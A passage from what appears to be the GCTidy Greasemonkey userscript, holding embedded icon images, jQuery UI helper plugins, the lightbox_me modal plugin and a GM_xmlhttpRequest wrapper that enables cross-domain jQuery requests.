	cacheMarker: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAYAAABm409WAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAFISURBVHjaYvz//z9jaGioORcX16p///6JMDExAYX+M4AwCCDT+Ngw/t+/fxmBZrz6/Pmz1c6dO58xAA1vyc/Pf//w4cP/1AJ37979HxQU9NXV1VWKITo6+t3r16//UxvcuHHjf2Bg4C2m379/84mIiDBQGygqKjJ8+fJFkYmBhgAUL0ywyBm6FgzpIAKB0Uge5pE8mopG42CoBBEHB8fLR48eUd3wq1evMvDy8l5nAtb+XrW1tR+B9TLVDL927RpDbm7urw8fPrgwgrzh5uamD/TJfmBzgx25GQILPi5Qm2bVKgyDwsLCGN6/f/8NOUhAmJGR8enHjx9tTp8+/YoROQ6cnZ2l0A0H0UCXsKurq99DtgRkOLDloAC0+zd6W+nUqVPPGNBtxYWRUxywDQVukoBoEB9b4wtDPyEL0CxhgRrOTKwDAQIMALGR/63m5xfBAAAAAElFTkSuQmCC',
	cacheMarkerHover: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAYAAABm409WAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAADVSURBVHjaYvy5yI4BCMSBeDUQ6zFQB9wEYl+22IOvGIEWgAy/D8ScDNQFf4FYiglIXKWB4SDADMTHQRYIMNAOyDMx0BiMWjBqwagFoxaMWjBqAcyClzQ0/x7IAi8g/kgDw78CsTMLkLgIxPZAvB+I2XEo5sJj0DcsYm+B2BrYbHnMAhUAWSIEamZgM2H1ydc8oeaiN9HF5+x/rpniKPkJXRxo8DMYmxHa8MIL2OMOgSgeoNrPSGJ8/////8zIyMgApKmSir4ADeWBGi4MpAgaDgIAAQYAJ6k2klzh+PwAAAAASUVORK5CYII=',
	cacheMarkerDisabled: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAYAAABm409WAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAEtSURBVHjaYiwvL2cAAgtmZuZV////F2FkZPzPQDn49PfvX9eOjo4rLEBOCwcHR7aCgoIAkGagBvj58yfX3bt3j1ZUVFgzAUGWsrIy1QwHAXZ2dgYlJSU+YKjsZAIGCx8rKysDtQHIwf/+/RNnYqAxGLVg1IJRC0YtGLVg1AKwBUDw8sePH1Q3+Nu3byDD7zEBa3+ve/fuffz9+zfVDAc5GFjpfwWa7QxqVVz89euX/fXr1/cDmyzs2DQA61YufX19DPGLFy+CXPkNi5a3QMOtgc2WxywwtUBDhIC0FDYLrl69ygukbiBbAjJ89+7d5i4uLk/Q1QMNfgZjs6DJPcNmwZYtW0CYH9jO+QiyBGQ40BAxYIvkNdDXDECaKqnoE9BQXqjhckA+QcNBACDAAIEgffP3QgfiAAAAAElFTkSuQmCC',
	cacheMarkerShadow: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAZCAYAAAC7OJeSAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAF+SURBVHja7JddS8MwFIZzap26iReKol6IqCh44f//HyqKE0FFUFCGzs4P1sX3yFsIIXY2VuhFDzx0a5rlPTkfWcVaa5piiWmQtWJaMa2YVsx/W1o2KCJVHSsmuBMtv1vvfjGmNsFJYNOanFoAi3ROAqLEWVgcIcoYDOH4qA4xS2AbrIAZd2M9Yf5u6DUH7+AGvKU17MgO2AVzAe/FE2edZ77DAwZgpPf/IqYH9sEBP09KQhK6rzn2DPoUZGLEaChWwR7D0/Uq005JZMM8uQOn4FbH9K9MjJgNcAQ2vdYQEmAC4xk4A+cMz+9K27N5sAUOwVpkaJ/AMbji7piqYtSjZeZGEZa8pFpCNmbFnID7qKbHhXqsmHWKeOW8lGFKpnRyTc4LcMkQmVgxiZOgAz6v4eqAWYfQ0fIJrpkfD15JR4lR+wCP2pTYV7rONWF1uc0u5+L9opnVcjbxhzN6lTnh6Ti7I17HHVLMS9XslrJXFeeglB86aK0mTXpv+hJgAOC9XbjOQqSAAAAAAElFTkSuQmCC',
	cacheMarkerSymbol: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAYAAABm409WAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAe5JREFUeNqsVr1rwkAUzzUXU6ltKRJQOihId+liW2wVBOcuCu4OrhYKjv0rOjj7B3SSurirk1saMKBTQYQgiBgl6R004TzPM4k+OO7dy3vv9z5yH8C2bVAqla4TicTjZrORRFEEAiIkF+jZ4Xly0zRtWZbXmqZ1O53OClQqlbtcLveE5o9wOJwUAhIAwOUXi4XeaDTeRqPRt5jP5x/q9fonQr2lFYOSJEk32Wz2fjgcqtAwDDsUCimkAplyUNBIJJIcj8cCpD/Qzo8BxHaQbpIXB6wgWDYuQFAHPBsncOgs/DrwUqatDPxG7VUfnjJqeiP6bnKQLOGxvyVPd6vJp4qcPqMg6wALUi7uPuBl4GdTsdbwFM54WboZHFsKX2eRX2f79FwAy7JcpUObyU8Gbg/2NdoLKK+0Wxk4yiQQDcqS8UCx7pmiKGC5XE4cIAeZxeOZ5kkZOdBN+ZNKpSwxGo3+TqfTSTqdfkEviotDhxfJs14emObzuVatVt/RldkFWFgsFi9jsdgzupsl2hhTuVz+ymQyO6Xo9XpCq9V6pQOBEK5UVe0OBgMTkB8LhYLMik7X9fNms2kgkDV+NKCxQs7lWq12FY/HTTrDfr+/2kl93yDorN1u27PZzMYzXrNKtmN/CIACgf/ORa8B/gkwAPIOOu1WiRzEAAAAAElFTkSuQmCC'
};

$.fn.gctidyVerticalResizer = function(options) {
	var minHeight = options.minHeight;
	var onResizeEnd = options.onResizeEnd;
	var context = options.context || document;

	return this.each(function() {
		var offsetY;
		var element = $(this);
		
		function onMouseDown(event) {
			$(context).mousemove(onMouseMove);
			$(context).mouseup(onMouseUp);
			offsetY = element.height() - event.pageY;
			event.preventDefault();
		}
		function onMouseMove(event) {
			var height = Math.max(minHeight, offsetY + event.pageY);
			element.css('height', height + 'px');
		}
		function onMouseUp(event) {
			$(context).unbind('mousemove', onMouseMove);
			$(context).unbind('mouseup', onMouseUp);
			onResizeEnd && onResizeEnd(event);
		}

		var resizer = $('<div class="gctidy-vertical-resizer"></div>');
		resizer.mousedown(onMouseDown);
		resizer.insertAfter(this);
	});
};

$.fn.gctidyHorizontalResizer = function(options) {
	var resizer = options.resizer;
	var minWidth = options.minWidth;
	var onResize = options.onResize;
	var onResizeEnd = options.onResizeEnd;
	var onToggle = options.onToggle;
	var context = options.context || document;

	return this.each(function() {
		var moved;
		var offsetX, startX;
		var element = $(this);
		
		function onMouseDown(event) {
			$(context).mousemove(onMouseMove);
			$(context).mouseup(onMouseUp);
			moved = 0;
			offsetX = element.width() - event.pageX;
			startX = event.pageX;
			event.preventDefault();
		}
		function onMouseMove(event) {
			moved += 1;
			if (onResize) {
				onResize(event.pageX, offsetX, startX);
			}
			else {
				element.css('width', Math.max(minWidth, offsetX + event.pageX) + 'px');
			}
		}
		function onMouseUp(event) {
			$(context).unbind('mousemove', onMouseMove);
			$(context).unbind('mouseup', onMouseUp);
			if (moved > 1) {
				onResizeEnd && onResizeEnd(element.width());
			}
			else {
				onToggle && onToggle(event);
			}
		}
		resizer.mousedown(onMouseDown);
	});
};

$.fn.gctidyTooltip = function(tooltip, options) {
	var delay = options && options.delay || 0;
	var fadeIn = options && options.fadeIn || 0;
	var fadeOut = options && options.fadeOut || 0;
	var hideOnClick = options && options.hideOnClick;
	var tooltipHover = options && options.tooltipHover;
	var getPosition = options && options.getPosition;
	var updatePosition = options && options.updatePosition;
	var buildTooltip;
	if (typeof tooltip == 'function') {
		buildTooltip = tooltip;
		tooltip = null;
	}
	
	return this.each(function() {
		var element = $(this);
		var isOver = false;
		var isVisible = false;
		
		function onMouseOver(event) {
			isOver = true;
			if (!tooltip && buildTooltip) {
				tooltip = buildTooltip();
			}
			setTimeout(function() {
				if (!isOver) {
					return;
				}
				isVisible = true;
				if (getPosition) {
					tooltip.css(getPosition(tooltip));
				}
				tooltip.fadeIn(fadeIn);
			}, delay);
			element.unbind('mouseover', onMouseOver);
			element.mousedown(onMouseDown);
			element.mouseout(onMouseOut);
			tooltipHover && tooltip.mouseout(onMouseOut);
			if (updatePosition) {
				element.mousemove(onMouseMove);
			}
		}
		function onMouseMove(event) {
			tooltip && tooltip.css(updatePosition(event));
		}
		function onMouseDown(event) {
			hideOnClick && onMouseOut(event);
		}
		function onMouseOut(event) {
			var related = event.relatedTarget;
			while (related) {
				if (element[0] == related || (tooltipHover && tooltip[0] == related)) {
					return;
				}
				related = related.parentNode;
			}
			isOver = false;
			if (isVisible) {
				isVisible = false;
				tooltip.fadeOut(fadeOut);
			}
			if (updatePosition) {
				element.unbind('mousemove', onMouseMove);
			}
			element.unbind('mousedown', onMouseDown);
			element.unbind('mouseout', onMouseOut);
			tooltipHover && tooltip.unbind('mouseout', onMouseOut);
			element.mouseover(onMouseOver);
		}
		element.mouseover(onMouseOver);
	});
};

$.fn.gctidySelectBox = function() {
	var controller = arguments[0].controller;
	var align = arguments[0].align == 'right' ? 'right' : 'left';
	var options = {};
	$.each(arguments[0].options, function() {
		options[this.name] = this;
	});
	var selected = (arguments[0].selected && options[arguments[0].selected]) ? options[arguments[0].selected] : arguments[0].options[0];
	
	if (!$('#gctidy-selectbox-style').length) {
		var style =
			'.gctidy-selectbox {background: white; cursor: pointer; position: absolute; display: none; z-index: 1; -webkit-box-shadow: #444 0px 0px 6px; -webkit-border-radius: 5px; -moz-box-shadow: #444 0px 0px 6px; -moz-border-radius: 5px; }' +
			'.gctidy-selectbox-anchor:hover > span {text-decoration: underline;}' +
			'.gctidy-selectbox-anchor small {font-size: 70%;}' +
			'#Content .gctidy-selectbox div {padding: 0.3em 0.8em 0.2em; border-bottom: 1px solid #e0e0e0; color: #999;  white-space: nowrap; margin-top: -1px;}' +
			'#Content .gctidy-selectbox ul {padding: 0.3em 0;}' +
			'#Content .gctidy-selectbox ul li {list-style-type: none; white-space: nowrap; padding: 0.2em 1.2em 0.2em 0.8em; margin: 0;}' +
			'#Content .gctidy-selectbox ul li:hover {color: white; background: #039;}' +
			'';
		$('<style type="text/css" id="gctidy-selectbox-style">' + style + '</style>').appendTo('head');
	}
	return this.each(function() {
		var element = $(this)
			.html('<span></span><small>&thinsp;&thinsp;▼</small>')
			.css({'position': 'relative', 'cursor': 'pointer'})
			.addClass('gctidy-selectbox-anchor');
		var selectBox = $('<div class="gctidy-selectbox"></div>')
			.appendTo(element)
			.css('top', '-0.3em')
			.css(align, '-0.8em');
		var header = $('<div></div>')
			.appendTo(selectBox)
			.css('text-align', align)
			.html('<span></span><small>&thinsp;&thinsp;▼</small>');
		var list = $('<ul></ul>')
			.appendTo(selectBox);
		$.each(options, function() {
			this.listItem = $('<li></li>')
				.appendTo(list)
				.text(this.title)
				.data('name', this.name);
		});
		
		controller.selected = function(name) {
			if (name) {
				var changed = (name != selected.name);
				selected = options[name];
				element.find('span').text(selected.title);
				header.find('span').text(selected.title);
				if (changed) {
					//element.trigger('change', [name]);
					var event = document.createEvent('Event');
					event.initEvent('change', false, false);
					element[0].dispatchEvent(event);
				}
			}
			return selected.name;
		};
		controller.addOption = function(option) {
			options[option.name] = option;
			option.listItem = $('<li></li>')
				.appendTo(list)
				.text(option.title);
		};
		controller.removeOption = function(name) {
			options[name].listItem.remove();
			delete options[name];
		};
		
		function getName(listItem) {
			var name;
			$.each(options, function() {
				if (this.listItem[0] == listItem[0]) {
					name = this.name;
					return false;
				}
			});
			return name;
		}
		function onClick(event) {
			selectBox.fadeIn(100, function() {
				$(document).click(onSelect);
			});
			element.unbind('click', onClick);
		}
		function onSelect(event) {
			var listItem = $(event.target).closest('li', selectBox);
			selectBox.fadeOut(20, function() {
				if (listItem.length) {
					controller.selected(getName(listItem));
				}
				element.click(onClick);
			});
			$(document).unbind('click', onSelect);
		}
		element.click(onClick);
		controller.selected(selected.name);
	});
};

$.fn.gctidyTabs = function() {
	var tabs = this.find('li');
	tabs.each(function(i) {
		var tab = $(this);
		if (i == 0) {
			tab.addClass('gctidy-tab-selected');
		}
		else { 
			$(tab.find('a').attr('href').match(/#.*/)[0]).hide();
		}
	});
	tabs.find('a').click(function() {
		var tab = $(this).parent();
		if (!tab.hasClass('gctidy-tab-selected')) {
			tabs.removeClass('gctidy-tab-selected');
			tabs.find('a').each(function() {
				$($(this).attr('href').match(/#.*/)[0]).hide();
			});
			tab.addClass('gctidy-tab-selected');
			$(tab.find('a').attr('href').match(/#.*/)[0]).show();
		}
		return false;
	});
	return this;
};

$.fn.gctidyScrollTo = function(speed, offset) {
	$('html,body').animate({scrollTop: this.offset().top + (offset || 0)}, speed || 200);
	return this;
};

$.fn.gctidyWindowResize = function(callback) {
	if (!this.length || this[0].nodeName != '#document') {
		return this;
	}
	
	var doc = $(this[0]);
	
	function onResize() {
		var size = doc.find('#gctidy-window-size').text().split(',');
		callback(size[0], size[1]);
	}
	
	doc.find('body').append('<div id="gctidy-window-size" style="display: none;"> </div>');
	doc.find('#gctidy-window-size').bind('DOMCharacterDataModified', onResize);

	var script = 
		'(function() {' +
		'	var windowSize = document.getElementById("gctidy-window-size");' +
		'	function onWindowResize() {' +
		'		windowSize.firstChild.data = window.innerWidth + "," + window.innerHeight;' +
		'	}' +
		'	onWindowResize();' +
		'	window.addEventListener("resize", onWindowResize, false);' +
		'})();';
		
	var element = doc[0].createElement('script');
	element.setAttribute('type', 'text/javascript');
	element.textContent = script;
	doc[0].getElementsByTagName('head')[0].appendChild(element);
	
	return this;
};

$.fn.gctidyClick = function(doc) {
	doc = doc ? $(doc)[0] : document;
	return this.each(function() {
		var event = doc.createEvent("Event");
		event.initEvent("click", true, true);
		this.dispatchEvent(event);
	});
};

/*
* Copyright (C) 1999-2009 Jive Software. All rights reserved.
*
* This software is the proprietary information of Jive Software. Use is subject to license terms.
*
* $ lightbox_me
* By: Buck Wilson
* Version : 2.0
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*     http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/
$.fn.lightbox_me = function(options) {
	return this.each(function() {
		var opts = $.extend({}, $.fn.lightbox_me.defaults, options);
		var $overlay = $('<div class="' + opts.classPrefix + '_overlay"/>');
		var $self = $(this);
		var $iframe = $('<iframe id="foo" style="z-index: ' + (opts.zIndex + 1) + '; display: none; border: none; margin: 0; padding: 0; position: absolute; width: 100%; height: 100%; top: 0; left: 0;"/>');
		var ie6 = ($.browser.msie && $.browser.version < 7);

		/*----------------------------------------------------
		   DOM Building
		---------------------------------------------------- */
		if (ie6) {
			var src = /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank';
			$iframe.attr('src', src);
			$('body').append($iframe);
		} // iframe shim for ie6, to hide select elements
		$('body').append($self).append($overlay);

		/*----------------------------------------------------
		   CSS stuffs
		---------------------------------------------------- */
		// set css of the modal'd window
		setSelfPosition();
		$self.css({left: '50%', marginLeft: ($self.outerWidth() / 2) * -1,  zIndex: (opts.zIndex + 3) });
		// set css of the overlay
		setOverlayHeight(); // pulled this into a function because it is called on window resize.
		$overlay
			.css({ position: 'absolute', width: '100%', top: 0, left: 0, right: 0, bottom: 0, zIndex: (opts.zIndex + 2), display: 'none' })
			.css(opts.overlayCSS);

		/*----------------------------------------------------
		   Animate it in.
		---------------------------------------------------- */
		$overlay.fadeIn(opts.overlaySpeed, function() {
			$self[opts.appearEffect](opts.lightboxSpeed, function() { setOverlayHeight(); opts.onLoad(); });
		});

		/*----------------------------------------------------
		   Bind Events
		---------------------------------------------------- */
		$(window).resize(setOverlayHeight)
				 .resize(setSelfPosition)
				 .scroll(setSelfPosition)
				 .keypress(observeEscapePress);
		$self.find(opts.closeSelector).add($overlay).click(function() { closeLightbox(); return false; });
		$self.bind('close', closeLightbox);
		$self.bind('resize', setSelfPosition);

		/*----------------------------------------------------
		   Private Functions
		---------------------------------------------------- */
		/* Remove or hide all elements */
		function closeLightbox() {
			if (opts.destroyOnClose) {
				$self.add($overlay).remove();
			} 
			else {
				$self.add($overlay).hide();
			}

			$iframe.remove();

			$(window).unbind('resize', setOverlayHeight);
			$(window).unbind('resize', setSelfPosition);

			opts.onClose();
		}
		/* Function to bind to the window to observe the escape key press */
		function observeEscapePress(e) {
			if(e.keyCode == 27 || (e.DOM_VK_ESCAPE == 27 && e.which==0)) closeLightbox();
		}
		/* Set the height of the overlay
				: if the document height is taller than the window, then set the overlay height to the document height.
				: otherwise, just set overlay height: 100%
		*/
		function setOverlayHeight() {
			if ($(window).height() < $(document).height()) {
				$overlay.css({height: $(document).height() + 'px'});
			} 
			else {
				$overlay.css({height: '100%'});
				if (ie6) {$('html,body').css('height','100%'); } // ie6 hack for height: 100%; TODO: handle this in IE7
			}
		}
		/* Set the position of the modal'd window ($self)
				: if $self is taller than the window, then make it absolutely positioned
				: otherwise fixed
		*/
		function setSelfPosition() {
			var s = $self[0].style;

			if (($self.height() + 80  >= $(window).height()) && ($self.css('position') != 'absolute' || ie6)) {
				var topOffset = $(document).scrollTop() + 40;
				$self.css({position: 'absolute', top: topOffset + 'px', marginTop: 0});
				if (ie6) {
					s.removeExpression('top');
				}
			} 
			else if ($self.height()+ 80  < $(window).height()) {
				if (ie6) {
					s.position = 'absolute';
					if (opts.centered) {
						s.setExpression('top', '(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight / 2) + (blah = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"')
						s.marginTop = 0;
					} else {
						var top = (opts.modalCSS && opts.modalCSS.top) ? parseInt(opts.modalCSS.top) : 0;
						s.setExpression('top', '((blah = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + '+top+') + "px"');
					}
				} 
				else {
					if (opts.centered) {
						$self.css({ position: 'fixed', top: '50%', marginTop: ($self.outerHeight() / 2) * -1});
					} 
					else {
						$self.css({ position: 'fixed'}).css(opts.modalCSS);
					}
				}
			}
		}
	});
};
$.fn.lightbox_me.defaults = {
	// animation
	appearEffect: "fadeIn",
	overlaySpeed: 300,
	lightboxSpeed: "fast",
	// close
	closeSelector: ".close",
	closeClick: true,
	closeEsc: true,
	// behavior
	destroyOnClose: false,
	// callbacks
	onLoad: function() {},
	onClose: function() {},
	// style
	classPrefix: 'lb',
	zIndex: 999,
	centered: false,
	modalCSS: {top: '40px'},
	overlayCSS: {background: 'black', opacity: 0.6}
};


// GM_XHR
//
// Author: Ryan Greenberg (ryan@ischool.berkeley.edu)
// Date: September 3, 2009
// Version: $Id: gm_jq_xhr.js 240 2009-11-03 17:38:40Z ryan $
// URL: http://courses.ischool.berkeley.edu/i290-4/f09/resources/gm_jq_xhr.js
// Blog article: http://blogs.ischool.berkeley.edu/i290-04f09/2009/09/16/working-around-the-same-origin-policy-in-greasemonkey/

// This allows jQuery to make cross-domain XHR by providing
// a wrapper for GM_xmlhttpRequest.
function GM_XHR() {
	this.type = null;
	this.url = null;
	this.async = null;
	this.username = null;
	this.password = null;
	this.status = null;
	this.headers = {};
	this.readyState = null;

	this.open = function(type, url, async, username, password) {
		this.type = type ? type : null;
		this.url = url ? url : null;
		this.async = async ? async : null;
		this.username = username ? username : null;
		this.password = password ? password : null;
		this.readyState = 1;
	};

	this.setRequestHeader = function(name, value) {
		this.headers[name] = value;
	};
		
	this.abort = function() {
		this.readyState = 0;
	};

	this.getResponseHeader = function(name) {
		return this.headers[name];
	};

	this.send = function(data) {
		this.data = data;
		var that = this;
		GM_xmlhttpRequest({
			method: this.type,
			url: this.url,
			headers: this.headers,
			data: this.data,
			onload: function(rsp) {
				// Populate wrapper object with all data returned from GM_XMLHttpRequest
				for (var k in rsp) {
					that[k] = rsp[k];
				}
			},
			onerror: function(rsp) {
				for (var k in rsp) {
					that[k] = rsp[k];
				}
			},
			onreadystatechange: function(rsp) {
				for (var k in rsp) {
					that[k] = rsp[k];
				}
				// this line was missing in Ryans code
				that.onreadystatechange && that.onreadystatechange(rsp);
			}
		});
	};
}

var zapp = GCTidy.Settings.get('zapp');

return GCTidy;
})(jQuery).init();